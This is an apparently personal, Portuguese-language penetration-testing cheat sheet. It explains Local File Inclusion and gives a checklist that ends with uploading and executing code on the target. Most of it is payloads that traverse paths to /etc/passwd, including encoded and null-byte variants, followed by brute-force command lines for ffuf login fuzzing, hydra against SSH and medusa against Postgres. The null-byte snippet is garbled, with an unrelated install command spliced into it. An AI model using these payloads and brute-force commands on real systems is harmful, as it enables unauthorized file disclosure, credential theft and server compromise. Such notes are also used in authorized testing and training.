## LFI 
<p>A vulnerabilidade de Local File Inclusion (LFI) surge da utilização insegura de parâmetros HTTP para controle de conteúdo em aplicações web, prática comum em linguagens como PHP, Node.js e Java. Frameworks frequentemente usam templates para incluir dinamicamente conteúdos com base em parâmetros da URL, como em chamadas do tipo /index.php?page=about. Quando esses parâmetros são passados diretamente para funções como include() sem validação, atacantes podem explorar essa falha para incluir arquivos locais sensíveis, como /etc/passwd ou arquivos de configuração. Essa exposição pode revelar código-fonte e credenciais, facilitando ataques mais graves como SQL Injection ou escalonamento de privilégios. Em ambientes mal configurados, LFI pode evoluir para execução remota de código, comprometendo completamente o servidor e possibilitando movimentação lateral e persistência.</p>
:fries: Checklist
- observe os campos das requisições em todos os métodos HTTP
- observe nos campos das requisições o tipo de informação usada 
- observe como a informação transmitida nos campos é processada
- observe funções de upload
- modifique o valor de um campo na requisição e observe como a aplicação responde
- adicione no campo payloads de LFI
- adicione no campo url para validar RFI
- crie um arquivo com código executável e faça o upload na aplicação
- procure acessar o arquivo para executar o código 

#### LFI Básico
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

```

#### Null Byte
```sudo apt install seclists](http://example.com/index.php?page=../../../etc/passwd%00```

Search in Seclists
```find /usr/share/seclists -iname “*[string]*”```

### FFUF
[1] Copia a requisição do burp e salva em um arquivo .txt<p>
[2] Adiciona nos campos de login: FUZZUSER e FUZZPASS

```ffuf -request req.txt -request-proto https -mode clusterbomb -w /usr/share/seclists/users.txt:FUZZUSER -w /usr/share/seclists/pass.txt:FUZZPASS -mc 302```

### HYDRA
#### SSH
```
hydra -v -l [username] -P senhas.txt [IP] ssh -s [PORT]
```
### MEDUSA
#### POSTGRES
Instalação do client no Ubuntu ```apt install postgresql-client-common```
```
medusa -H ips.txt -u [nome-do-usuario] -p [senha] -M [modulo] -n [porta]

### ver os módulos

medusa -d 
```
<p>NOTA: Em alguns ambientes pode ser necessário instalar o Postgres-Client antes de executar um brute-force nesse serviço</p>
```
apt install postgresql-client-common # instalação no Ubuntu
```


